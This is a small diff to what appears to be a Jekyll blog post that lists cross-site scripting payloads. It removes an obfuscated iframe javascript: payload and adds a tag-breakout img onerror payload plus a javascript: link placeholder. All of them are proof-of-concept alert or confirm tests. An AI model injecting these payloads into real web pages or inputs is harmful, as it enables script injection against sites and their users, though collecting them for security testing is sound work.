@@ -6,5 +6,8 @@ categories: jekyll update
 ---
 
 
-<iframe/%00/ src=javaSCRIPT&colon;alert(/test/)
+Some of the great XSS payloads used by experts in security industry,
+
+'"></title></script><img src=x onerror=confirm(1)>
+<a href="javascript:{ js code here}"> POC </a>
 
